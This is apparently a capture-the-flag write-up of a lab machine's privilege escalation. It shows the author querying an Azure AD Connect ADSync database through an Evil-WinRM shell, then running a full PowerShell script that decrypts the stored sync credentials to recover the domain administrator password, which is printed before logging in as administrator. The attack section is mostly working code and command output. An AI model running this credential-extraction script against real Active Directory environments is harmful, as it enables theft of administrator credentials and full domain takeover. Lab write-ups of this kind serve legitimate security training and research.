# 15 - PrivEsc

# Azure Admins Group
```bash
*Evil-WinRM* PS C:\Users> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                          Attributes
=========================================== ================ ============================================ ==================================================
Everyone                                    Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
MEGABANK\Azure Admins                       Group            S-1-5-21-391775091-850290835-3566037492-2601 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
```

I guess Azure Admins group is giving us some kind of access to Azure


# Azure AD Sync

```powershell
*Evil-WinRM* PS C:\Program Files> dir


    Directory: C:\Program Files


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         1/2/2020   9:36 PM                Common Files
d-----         1/2/2020   2:46 PM                internet explorer
d-----         1/2/2020   2:38 PM                Microsoft Analysis Services
d-----         1/2/2020   2:51 PM                Microsoft Azure Active Directory Connect
d-----         1/2/2020   3:37 PM                Microsoft Azure Active Directory Connect Upgrader
d-----         1/2/2020   3:02 PM                Microsoft Azure AD Connect Health Sync Agent
d-----         1/2/2020   2:53 PM                Microsoft Azure AD Sync
d-----         1/2/2020   2:38 PM                Microsoft SQL Server
d-----         1/2/2020   2:25 PM                Microsoft Visual Studio 10.0
d-----         1/2/2020   2:32 PM                Microsoft.NET
d-----         1/3/2020   5:28 AM                PackageManagement
d-----         1/2/2020   9:37 PM                VMware
d-r---         1/2/2020   2:46 PM                Windows Defender
d-----         1/2/2020   2:46 PM                Windows Defender Advanced Threat Protection
d-----        9/15/2018  12:19 AM                Windows Mail
d-----         1/2/2020   2:46 PM                Windows Media Player
d-----        9/15/2018  12:19 AM                Windows Multimedia Platform
d-----        9/15/2018  12:28 AM                windows nt
d-----         1/2/2020   2:46 PM                Windows Photo Viewer
d-----        9/15/2018  12:19 AM                Windows Portable Devices
d-----        9/15/2018  12:19 AM                Windows Security
d-----         1/3/2020   5:28 AM                WindowsPowerShell
```


Azure AD Connect is installed. Another interesting directory is Azure AD Sync. Azure AD Sync provides password hash synchronization between Active Directory And Azure Active Directory. It comes with Azure AD Connect which is a Microsoft tool for integrating on-premises active directory with azure AD.

https://docs.microsoft.com/en-us/azure/active-directory/hybrid/whatis-azure-ad-connect
https://docs.microsoft.com/en-us/azure/active-directory/hybrid/reference-connect-accounts-permissions
https://blog.xpnsec.com/azuread-connect-for-redteam/


 Azure AD Connect creates 3 accounts and these are:

* **AD DS Connector account**: performs read/write operations to Active Directory
* **ADSync service account**: runs the synchronization service and  accesses the SQL database
* **Azure AD Connector account**: writes to Azure AD


Azure provides two options in the installation; express and custom settings. Express setting is a sort of *quick install* process it performs all the necessary operations on behalf of the user. Custom settings, however, does take some time to configure and the user doing the installation is responsible for creating all the aforementioned accounts.

# Users
```powershell
*Evil-WinRM* PS C:\Program Files> net user

User accounts for \\

-------------------------------------------------------------------------------
AAD_987d7f2f57d2         Administrator            dgalanos
Guest                    krbtgt                   mhope
roleary                  SABatchJobs              smorgan
svc-ata                  svc-bexec                svc-netapp
The command completed with one or more errors.
```

AAD_ user is the `ADSync service account`. This account stores encrypted password of other users in a database using DPAPI. The database stores also configuration and management data. It is created with the installation of Azure AD Connect. It looks like there is no AD DS connector account created probably a custom installation.


```bash
*Evil-WinRM* PS C:\Users\mhope\.Azure> sqlcmd -Q 'select name from sys.databases'                                                                                                             
name                                                                                                                                                                                          
--------------------------------------------------------------------------------------------------------------------------------                                                              
master                                                                                                                                                                                        
tempdb                                                                                                                                                                                        
model                                                                                                                                                                                         
msdb                                                                                                                                                                                          
ADSync                                                                                                                                                                                        
                                                                                                                                                                                              
(5 rows affected)       
```

ADSync is our database.

# Tables
```powershell
*Evil-WinRM* PS C:\Program Files> sqlcmd -Q 'SELECT TABLE_NAME FROM ADSync.INFORMATION_SCHEMA.TABLES'
TABLE_NAME
--------------------------------------------------------------------------------------------------------------------------------
mms_metaverse
mms_metaverse_lineageguid
mms_metaverse_lineagedate
mms_connectorspace
mms_cs_object_log
mms_cs_link
mms_management_agent
mms_synchronization_rule
mms_csmv_link
mms_metaverse_multivalue
mms_mv_link
mms_partition
mms_watermark_history
mms_run_history
mms_run_profile
mms_server_configuration
mms_step_history
mms_step_object_details
```

# mms_management_agent columns
```powershell
*Evil-WinRM* PS C:\Program Files> sqlcmd -Q "use ADSync;SELECT name FROM sys.columns WHERE object_id = OBJECT_ID('mms_management_agent')"
Changed database context to 'ADSync'.
name
--------------------------------------------------------------------------------------------------------------------------------
ma_id
ma_name
ma_type
subtype
ma_listname
company_name
version_number
internal_version_number
creation_date
modification_date
capabilities_mask
ma_export_type
current_run_number
key_id
ma_description
ui_settings_xml
ma_extension_xml
ma_schema_xml
attribute_inclusion_xml
controller_configuration_xml
controller_configuration_password
private_configuration_xml
encrypted_configuration
dn_construction_xml
component_mappings_xml
full_import_required
full_sync_required
```


# private_configuration dump
```powershell
*Evil-WinRM* PS C:\Program Files> sqlcmd -Q 'use ADSync;select private_configuration_xml from mms_management_agent'
Changed database context to 'ADSync'.
private_configuration_xml
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
<MAConfig>
      <primary_class_mappings>
        <mapping>
          <primary_class>contact</primary_class>
          <oc-value>contact</oc-value>
        </mapping>
        <mapping>
          <primary_class>device</primary_class>
          <oc-v
<adma-configuration>
 <forest-name>MEGABANK.LOCAL</forest-name>
 <forest-port>0</forest-port>
 <forest-guid>{00000000-0000-0000-0000-000000000000}</forest-guid>
 <forest-login-user>administrator</forest-login-user>
 <forest-login-domain>MEGABANK.LOCAL

(2 rows affected)
```


Password is removed from this xml, it is stored somewhere else, in encrypted_configuration

# encrypted_configuration
```
*Evil-WinRM* PS C:\Users\mhope\Documents> sqlcmd -Q 'use ADSync;select encrypted_configuration from mms_management_agent'
Changed database context to 'ADSync'.
encrypted_configuration
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
8AAAAAgAAACfn4Lemwuy/a+hBmbvJMeKVf/3ScxlxjHq9eM7Gjy2YLrrsqeRUZh51ks9Dt6BFTSd8OdCHG209rYsFX6f5Az4ZdpscNYSncIaEaI4Re4qw4vNPSIb3DXX6FDtfQHF97fVDV6wp4e3XTni1Y/DEATO+fgJuveCSDf+lX0UNnQEGrTfdDY9sK5neJ5vquLr0pdobAI6vU2g55IrwahGfKmwFjWF5q+qJ3zGR1nfxgsc0xRUNY2xWKoz
8AAAAAgAAABQhCBBnwTpdfQE6uNJeJWGjvps08skADOJDqM74hw39rVWMWrQukLAEYpfquk2CglqHJ3GfxzNWlt9+ga+2wmWA0zHd3uGD8vk/vfnsF3p2aKJ7n9IAB51xje0QrDLNdOqOxod8n7VeybNW/1k+YWuYkiED3xO8Pye72i6D9c5QTzjTlXe5qgd4TCdp4fmVd+UlL/dWT/mhJHve/d9zFr2EX5r5+1TLbJCzYUHqFLvvpCd1rJEr68g
```

# [decrypt.ps1](https://blog.xpnsec.com/azuread-connect-for-redteam/)
```bash
┌─[user@parrot]─[10.10.14.18]─[~/htb/monteverde]
└──╼ $ cat decrypt.ps1 
$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Data Source=(local);Initial Catalog=ADSync;Integrated Security=SSPI"
$client.Open()
$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT keyset_id, instance_id, entropy FROM mms_server_configuration"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$key_id = $reader.GetInt32(0)
$instance_id = $reader.GetGuid(1)
$entropy = $reader.GetGuid(2)
$reader.Close()

$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$config = $reader.GetString(0)
$crypted = $reader.GetString(1)
$reader.Close()

add-type -path 'C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll'
$km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
$km.LoadKeySet($entropy, $instance_id, $key_id)
$key = $null
$km.GetActiveCredentialKey([ref]$key)
$key2 = $null
$km.GetKey(1, [ref]$key2)
$decrypted = $null
$key2.DecryptBase64ToString($crypted, [ref]$decrypted)

$domain = select-xml -Content $config -XPath "//parameter[@name='forest-login-domain']" | select @{Name = 'Domain'; Expression = {$_.node.InnerXML}}
$username = select-xml -Content $config -XPath "//parameter[@name='forest-login-user']" | select @{Name = 'Username'; Expression = {$_.node.InnerXML}}
$password = select-xml -Content $decrypted -XPath "//attribute" | select @{Name = 'Password'; Expression = {$_.node.InnerText}}

Write-Host ("Domain: " + $domain.Domain)
Write-Host ("Username: " + $username.Username)
Write-Host ("Password: " + $password.Password)
```


# Administrator password
```bash
*Evil-WinRM* PS C:\Users\mhope\Documents> upload decrypt.ps1
Info: Uploading decrypt.ps1 to C:\Users\mhope\Documents\decrypt.ps1

                                                             
Data: 2252 bytes of 2252 bytes copied

Info: Upload successful!

*Evil-WinRM* PS C:\Users\mhope\Documents> .\decrypt.ps1
Domain: MEGABANK.LOCAL
Username: administrator
Password: d0m@in4dminyeah!
```


# Shell

```bash
┌─[user@parrot]─[10.10.14.18]─[~/htb/monteverde]
└──╼ $ evil-winrm -i  10.10.10.172 -u administrator -p 'd0m@in4dminyeah!'

Evil-WinRM shell v2.4

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
megabank\administrator
```